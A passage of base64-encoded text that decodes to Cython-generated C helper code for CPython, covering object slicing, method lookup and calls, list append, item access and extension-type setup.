ydCA9IFB5TG9uZ19Gcm9tU3NpemVfdChjc3RhcnQpO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXJ0KSkgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgfSBlbHNlXG4gICAgICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gUHlfTm9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChfcHlfc3RvcCkge1xuICAgICAgICAgICAgICAgIHB5X3N0b3AgPSAqX3B5X3N0b3A7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmIChoYXNfY3N0b3ApIHtcbiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RvcCA9IHB5X3N0b3AgPSBQeUxvbmdfRnJvbVNzaXplX3QoY3N0b3ApO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0b3ApKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBQeV9YREVDUkVGKG93bmVkX3N0YXJ0KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlXG4gICAgICAgICAgICAgICAgICAgIHB5X3N0b3AgPSBQeV9Ob25lO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcHlfc2xpY2UgPSBQeVNsaWNlX05ldyhweV9zdGFydCwgcHlfc3RvcCwgUHlfTm9uZSk7XG4gICAgICAgICAgICBQeV9YREVDUkVGKG93bmVkX3N0YXJ0KTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RvcCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5X3NsaWNlKSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAgICAgcmVzdWx0ID0gbXAtPm1wX3N1YnNjcmlwdChvYmosIHB5X3NsaWNlKTtcbiNlbHNlXG4gICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0dldEl0ZW0ob2JqLCBweV9zbGljZSk7XG4jZW5kaWZcbiAgICAgICAgaWYgKCFfcHlfc2xpY2UpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihweV9zbGljZSk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgb2JqX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShvYmopKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IGlzIHVuc2xpY2VhYmxlIiwgb2JqX3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9ial90eXBlX25hbWUpO1xuYmFkOlxuICAgIHJldHVybiBOVUxMO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MoUHlPYmplY3QqIGZ1bmN0aW9uLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpIHtcbiAgICBQeU9iamVjdCAqYXJnc1szXSA9IHtOVUxMLCBhcmcxLCBhcmcyfTtcbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuY3Rpb24sIGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2QoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICoqbWV0aG9kKSB7XG4gICAgUHlPYmplY3QgKmF0dHI7XG4jaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTICYmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgICBfX1B5eF9UeXBlTmFtZSB0eXBlX25hbWU7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBQeU9iamVjdCAqZGVzY3I7XG4gICAgZGVzY3JnZXRmdW5jIGYgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICoqZGljdHB0ciwgKmRpY3Q7XG4gICAgaW50IG1ldGhfZm91bmQgPSAwO1xuICAgIGFzc2VydCAoKm1ldGhvZCA9PSBOVUxMKTtcbiAgICBpZiAodW5saWtlbHkodHAtPnRwX2dldGF0dHJvICE9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgICAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpO1xuICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSh0cC0+dHBfZGljdCA9PSBOVUxMKSAmJiB1bmxpa2VseShQeVR5cGVfUmVhZHkodHApIDwgMCkpIHtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIGRlc2NyID0gX1B5VHlwZV9Mb29rdXAodHAsIG5hbWUpO1xuICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHtcbiAgICAgICAgUHlfSU5DUkVGKGRlc2NyKTtcbiNpZiBkZWZpbmVkKFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpICYmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1JcbiAgICAgICAgaWYgKF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUoZGVzY3IpLCBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSlcbiNlbHNlXG4gICAgICAgICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRURcbiAgICAgICAgaWYgKGxpa2VseShQeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSB8fCBfX1B5eF9JU19UWVBFKGRlc2NyLCAmUHlNZXRob2REZXNjcl9UeXBlKSB8fCBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSkpXG4gICAgICAgICNlbHNlXG4gICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKVxuICAgICAgICAjZW5kaWZcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICBtZXRoX2ZvdW5kID0gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGYgPSBQeV9UWVBFKGRlc2NyKS0+dHBfZGVzY3JfZ2V0O1xuICAgICAgICAgICAgaWYgKGYgIT0gTlVMTCAmJiBQeURlc2NyX0lzRGF0YShkZXNjcikpIHtcbiAgICAgICAgICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuICAgIGRpY3RwdHIgPSBfUHlPYmplY3RfR2V0RGljdFB0cihvYmopO1xuICAgIGlmIChkaWN0cHRyICE9IE5VTEwgJiYgKGRpY3QgPSAqZGljdHB0cikgIT0gTlVMTCkge1xuICAgICAgICBQeV9JTkNSRUYoZGljdCk7XG4gICAgICAgIGF0dHIgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihkaWN0LCBuYW1lKTtcbiAgICAgICAgaWYgKGF0dHIgIT0gTlVMTCkge1xuICAgICAgICAgICAgUHlfSU5DUkVGKGF0dHIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpY3QpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKGRpY3QpO1xuICAgIH1cbiAgICBpZiAobWV0aF9mb3VuZCkge1xuICAgICAgICAqbWV0aG9kID0gZGVzY3I7XG4gICAgICAgIHJldHVybiAxO1xuICAgIH1cbiAgICBpZiAoZiAhPSBOVUxMKSB7XG4gICAgICAgIGF0dHIgPSBmKGRlc2NyLCBvYmosIChQeU9iamVjdCAqKVB5X1RZUEUob2JqKSk7XG4gICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgIGdvdG8gdHJ5X3VucGFjaztcbiAgICB9XG4gICAgaWYgKGxpa2VseShkZXNjciAhPSBOVUxMKSkge1xuICAgICAgICAqbWV0aG9kID0gZGVzY3I7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICB0eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfQXR0cmlidXRlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QgaGFzIG5vIGF0dHJpYnV0ZSBcJyVVXCciLFxuICAgICAgICAgICAgICAgICB0eXBlX25hbWUsIG5hbWUpO1xuICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZSh0eXBlX25hbWUpO1xuICAgIHJldHVybiAwO1xuI2Vsc2VcbiAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpO1xuICAgIGdvdG8gdHJ5X3VucGFjaztcbiNlbmRpZlxudHJ5X3VucGFjazpcbiNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KGF0dHIpICYmIFB5TWV0aG9kX0NoZWNrKGF0dHIpICYmIGxpa2VseShQeU1ldGhvZF9HRVRfU0VMRihhdHRyKSA9PSBvYmopKSB7XG4gICAgICAgIFB5T2JqZWN0ICpmdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihhdHRyKTtcbiAgICAgICAgUHlfSU5DUkVGKGZ1bmN0aW9uKTtcbiAgICAgICAgUHlfREVDUkVGKGF0dHIpO1xuICAgICAgICAqbWV0aG9kID0gZnVuY3Rpb247XG4gICAgICAgIHJldHVybiAxO1xuICAgIH1cbiNlbmRpZlxuICAgICptZXRob2QgPSBhdHRyO1xuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiAhKENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKSlcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBtZXRob2QsIFB5T2JqZWN0KiBhcmcpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIGFyZyk7XG4gICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpIHtcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSlcbiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtvYmosIGFyZ307XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDtcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZztcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzO1xuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAyIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKm1ldGhvZCA9IE5VTEwsICpyZXN1bHQ7XG4gICAgaW50IGlzX21ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChvYmosIG1ldGhvZF9uYW1lLCAmbWV0aG9kKTtcbiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKG1ldGhvZCwgb2JqLCBhcmcpO1xuICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKG1ldGhvZCwgYXJnKTtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9BcHBlbmQoUHlPYmplY3QqIEwsIFB5T2JqZWN0KiB4KSB7XG4gICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChMKSkpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TGlzdF9BcHBlbmQoTCwgeCkgPCAwKSkgcmV0dXJuIC0xO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIFB5T2JqZWN0KiByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXBwZW5kLCB4KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFyZXR2YWwpKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICBQeV9ERUNSRUYocmV0dmFsKTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJbmRleChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqaW5kZXgpIHtcbiAgICBQeU9iamVjdCAqcnVuZXJyID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IGtleV92YWx1ZTtcbiAgICBrZXlfdmFsdWUgPSBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChpbmRleCk7XG4gICAgaWYgKGxpa2VseShrZXlfdmFsdWUgIT0gLTEgfHwgIShydW5lcnIgPSBQeUVycl9PY2N1cnJlZCgpKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfRmFzdChvYmosIGtleV92YWx1ZSwgMCwgMSwgMSk7XG4gICAgfVxuICAgIGlmIChQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMocnVuZXJyLCBQeUV4Y19PdmVyZmxvd0Vycm9yKSkge1xuICAgICAgICBfX1B5eF9UeXBlTmFtZSBpbmRleF90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUoaW5kZXgpKTtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX0luZGV4RXJyb3IsXG4gICAgICAgICAgICAiY2Fubm90IGZpdCBcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBpbnRvIGFuIGluZGV4LXNpemVkIGludGVnZXIiLCBpbmRleF90eXBlX25hbWUpO1xuICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoaW5kZXhfdHlwZV9uYW1lKTtcbiAgICB9XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0dldEl0ZW1fU2xvdyhQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KSB7XG4gICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTtcbiAgICBpZiAobGlrZWx5KFB5VHlwZV9DaGVjayhvYmopKSkge1xuICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsYXNzX2dldGl0ZW0pO1xuICAgICAgICBpZiAoIW1ldGgpIHtcbiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRoLCBrZXkpO1xuICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpO1xuICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBvYmpfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKG9iaikpO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICJcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QgaXMgbm90IHN1YnNjcmlwdGFibGUiLCBvYmpfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqX3R5cGVfbmFtZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0dldEl0ZW0oUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmtleSkge1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgUHlNYXBwaW5nTWV0aG9kcyAqbW0gPSB0cC0+dHBfYXNfbWFwcGluZztcbiAgICBQeVNlcXVlbmNlTWV0aG9kcyAqc20gPSB0cC0+dHBfYXNfc2VxdWVuY2U7XG4gICAgaWYgKGxpa2VseShtbSAmJiBtbS0+bXBfc3Vic2NyaXB0KSkge1xuICAgICAgICByZXR1cm4gbW0tPm1wX3N1YnNjcmlwdChvYmosIGtleSk7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9HZXRJbmRleChvYmosIGtleSk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9HZXRJdGVtX1Nsb3cob2JqLCBrZXkpO1xufVxuI2VuZGlmXG5cblxuI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMClcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShQeU9iamVjdCAqbywgaW50IGFsd2F5c19jYWxsLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgaWYgKF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA8IDB4MDMwOTAwMDApIHJldHVybiAwO1xuICAgICNlbmRpZlxuICAgIGlmICghYWx3YXlzX2NhbGwpIHtcbiAgICAgICAgUHlUeXBlT2JqZWN0ICpiYXNlID0gX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTtcbiAgICAgICAgdW5zaWduZWQgbG9uZyBmbGFncyA9IFB5VHlwZV9HZXRGbGFncyhiYXNlKTtcbiAgICAgICAgaWYgKGZsYWdzICYgUHlfVFBGTEFHU19IRUFQVFlQRSkge1xuICAgICAgICAgICAgcmV0dXJuIDA7XG4gICAgICAgIH1cbiAgICB9XG4gICAgUHlfVklTSVQoKFB5T2JqZWN0KilQeV9UWVBFKG8pKTtcbiAgICByZXR1cm4gMDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlfc3NpemVfdCBfX1B5eF9HZXRUeXBlRGljdE9mZnNldCh2b2lkKSB7XG4gICAgUHlPYmplY3QgKnRwX2RpY3RvZmZzZXRfbztcbiAgICBQeV9zc2l6ZV90IHRwX2RpY3RvZmZzZXQ7XG4gICAgdHBfZGljdG9mZnNldF9vID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSgmUHlUeXBlX1R5cGUpLCAiX19kaWN0b2Zmc2V0X18iKTtcbiAgICBpZiAodW5saWtlbHkoIXRwX2RpY3RvZmZzZXRfbykpIHJldHVybiAtMTtcbiAgICB0cF9kaWN0b2Zmc2V0ID0gUHlMb25nX0FzU3NpemVfdCh0cF9kaWN0b2Zmc2V0X28pO1xuICAgIFB5X0RFQ1JFRih0cF9kaWN0b2Zmc2V0X28pO1xuICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IDApKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhcbiAgICAgICAgICAgIFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJcJ3R5cGVcJyBkb2VzblwndCBoYXZlIGEgZGljdG9mZnNldCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0IDwgMCkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlwndHlwZVwnIGhhcyBhbiB1bmV4cGVjdGVkIG5lZ2F0aXZlIGRpY3RvZmZzZXQuICJcbiAgICAgICAgICAgICJQbGVhc2UgcmVwb3J0IHRoaXMgYXMgQ3l0aG9uIGJ1ZyIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiB0cF9kaWN0b2Zmc2V0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRUeXBlRGljdChQeVR5cGVPYmplY3QgKnRwKSB7XG4gICAgc3RhdGljIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHtcbiAgICAgICAgdHBfZGljdG9mZnNldCA9IF9fUHl4X0dldFR5cGVEaWN0T2Zmc2V0KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICB0cF9kaWN0b2Zmc2V0ID0gMDsgLy8gdHJ5IGFnYWluIG5leHQgdGltZT9cbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiAqKFB5T2JqZWN0KiopKChjaGFyKil0cCArIHRwX2RpY3RvZmZzZXQpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCwgUHlPYmplY3QgKmssIFB5T2JqZWN0ICp2KSB7XG4gICAgaW50IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqdHBfZGljdDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdHBfZGljdCA9IF9fUHl4X0dldFR5cGVEaWN0KHRwKTtcbiAgICBpZiAodW5saWtlbHkoIXRwX2RpY3QpKSByZXR1cm4gLTE7XG4jZWxzZVxuICAgIHRwX2RpY3QgPSB0cC0+dHBfZGljdDtcbiNlbmRpZlxuICAgIHJlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHRwX2RpY3QsIGssIHYpO1xuICAgIGlmIChsaWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHRwKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5T2JqZWN0X0hhc0F0dHIodiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9uYW1lKSkpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpzZXROYW1lUmVzdWx0ID0gUHlPYmplY3RfQ2FsbE1ldGhvZE9iakFyZ3ModiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9uYW1lLCAgKFB5T2JqZWN0ICopIHRwLCBrLCBOVUxMKTtcbiAgICAgICAgICAgIGlmICghc2V0TmFtZVJlc3VsdCkgcmV0dXJuIC0xO1xuICAgICAgICAgICAgUHlfREVDUkVGKHNldE5hbWVSZXN1bHQpO1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKFB5VHlwZV9TcGVjICpzcGVjLCBQeVR5cGVPYmplY3QgKnR5cGUpIHtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMVxuICAgIENZVEhPTl9VTlVTRURfVkFSKHNwZWMpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cGUpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7XG4jZWxzZVxuICAgIGNvbnN0IFB5VHlwZV9TbG90ICpzbG90ID0gc3BlYy0+c2xvdHM7XG4gICAgaW50IGNoYW5nZWQgPSAwO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgd2hpbGUgKHNsb3QgJiYgc2xvdC0+c2xvdCAmJiBzbG90LT5zbG90ICE9IFB5X3RwX21lbWJlcnMpXG4gICAgICAgIHNsb3QrKztcbiAgICBpZiAoc2xvdCAmJiBzbG90LT5zbG90ID09IFB5X3RwX21lbWJlcnMpIHtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIGNvbnN0XG4jZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04pXG4gICAgICAgICAgICBQeU1lbWJlckRlZiAqbWVtYiA9IChQeU1lbWJlckRlZiopIHNsb3QtPnBmdW5jO1xuICAgICAgICB3aGlsZSAobWVtYiAmJiBtZW1iLT5uYW1lKSB7XG4gICAgICAgICAgICBpZiAobWVtYi0+bmFtZVswXSA9PSBcJ19cJyAmJiBtZW1iLT5uYW1lWzFdID09IFwnX1wnKSB7XG4gICAgICAgICAgICAgICAgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX193ZWFrbGlzdG9mZnNldF9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTtcbiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfd2Vha2xpc3RvZmZzZXQgPSBtZW1iLT5vZmZzZXQ7XG4gICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fZGljdG9mZnNldF9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTtcbiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfZGljdG9mZnNldCA9IG1lbWItPm9mZnNldDtcbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIpID09IDApIHtcbiAgICAgICAgICAgICAgICAgICAg